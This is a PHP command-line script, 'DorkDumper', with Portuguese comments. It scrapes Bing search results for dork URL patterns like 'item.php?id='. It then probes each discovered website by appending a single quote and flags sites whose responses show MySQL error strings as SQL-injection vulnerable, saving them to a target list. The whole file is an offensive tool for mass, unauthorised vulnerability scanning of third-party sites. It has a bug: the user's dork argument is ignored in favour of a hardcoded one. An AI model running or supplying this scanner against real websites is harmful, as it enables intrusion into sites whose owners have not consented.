<?php

#Por: Nicholas Ferreira - 08/06/20

if(PHP_SAPI != "cli"){
	die("Run me on commandline plz.");
}

error_reporting(0);
banner();
if($argc !== 4){
	die("
  Usage: php ddumper.php <dork> <pages> <file.txt>
  <dork> = Dork to be used on search. Ex: news.php?id=
  <pages> = Number of pages of the searcher to dump
  <file.txt> = Text file to save the dumped URLs

  ex: php ddumper.php item.php?id= 20 urls.txt
   
  ");
}else{
	$dork = $argv[1];
	$pages = (int)$argv[2];
	$file = $argv[3];
	
	if($pages==0){
		echo("\e[31m[-] Error: <pages> must be a positive integer.\033[0m\r\n");
		die("ex: php ddumper.php item.php?id= 20 urls.txt\r\n");
	}
	$arr = scan("pagina.php?id=", $pages, $file);
	if(count($arr) > 0){
		echo "~Potentially vulnerable websites: ".count($arr)."\r\n";
	}else{
		die("\e[31m[-] No vulnerable website was found.\033[0m\r\n");
	}
	try{
		$vulns = isVuln($arr);
	}catch (Exception $e) {
    		echo 'Error: ',  $e->getMessage(), "\n";
	}
	
	foreach($vulns as $link){
		$fp = fopen($file, "a");
		$fw = fwrite($fp, $link."\r\n");
	}
	if($fw){
		echo "\r\n\e[32m[+]\033[0m Dumping completed. URLs were saved on ".$file."\r\n";
	}else{
		echo "\r\n\e[31m[-]\033[0m Could not save the file.\r\n";
	}
	
}



# ===================================================================
# ======================= | SÓ FUNÇÃO BRABA | =======================
# ===================================================================

function get_content($url){
	$options = array(CURLOPT_RETURNTRANSFER => 1);
	$ch = curl_init($url);
	curl_setopt_array($ch, $options);
	$result = curl_exec($ch); 
	curl_close($ch);
	return $result;
}

function contains($haystack, array $needle){
	$return = 0;
	foreach($needle as $a){
		if(strpos($haystack, $a) !== false){
			$return += 1;
		}
	}
	return $return;
}

function parseURL($url, $type=1){
	$type ? $rtn = explode("/", substr(str_replace("www.", "", $url), 7))[0] : $rtn = substr(str_replace("www.", "", $url), 0, -5);
	return $rtn;
}

function scan($dork, $paginas, $file){
	$total = $paginas*10;
	$arr = array();
	$sites = array();
	$forbidden = array("bing", "microsoft", "w3.org", "_", "live.com");
	for($i=0;$i<=$total;$i+=10){
		echo "~Dumping URLs... (".$i."/".$total." links)\r";
		$bing = 'http://www.bing.com/search?q='.$dork.'&first='.$i.'&form=PERE';  //'inurl:' não funciona direito no bing
		$response = htmlspecialchars(get_content($bing));
		preg_match_all('#\bhttp?://[^,\s()<>]+(?:\([\w\d]+\)|([^,[:punct:]\s]|/))#', $response, $match);
		foreach($match[0] as $link){
			if(!contains($link, $forbidden)){ 	//verifica se é site lixo do bing
				if(!in_array(parseURL($link), $sites)){	//verifica se o site ja ta na lista
					array_push($sites, parseURL($link));
					array_push($arr, parseURL($link, 0));
				}
			}
		}
	}
	echo "\r\n";
	sort($arr);	// ordem alfabética
	return($arr);
}

function isVuln($arr){
	$founds = 0;
	$vulns = array();
	$errors = array("erro de sintaxe", "You have an error in your SQL syntax", "mysql_free_result", "mysql_result", "Illegal string offset", "not a valid MySQL result");
	for($i=0;$i<=count($arr);$i++){
		echo "~Analyzing URLs... (".$i."/".count($arr)."). Founds: ".$founds."\r";
		$link = $arr[$i];
		$response = (get_content($link."%27"));
		foreach($errors as $erro){
			if(stripos($response, $erro) !== false){
				array_push($vulns, $link);
				$founds += 1;
			}
		}
	}
	echo "\r\n";
	return $vulns;
}

function banner(){
	echo "\e[92m
  ____             _    ____                                  
 |  _ \  ___  _ __| | _|  _ \ _   _ _ __ ___  _ __   ___ _ __ 
 | | | |/ _ \| '__| |/ | | | | | | | '_ ` _ \| '_ \ / _ | '__|
 | |_| | (_) | |  |   <| |_| | |_| | | | | | | |_) |  __| |   
 |____/ \___/|_|  |_|\_|____/ \__,_|_| |_| |_| .__/ \___|_|   
                                             |_|              
		\e[93mCoded by Nicholas Ferreira\033[0m
\033[0m
";
}

?>
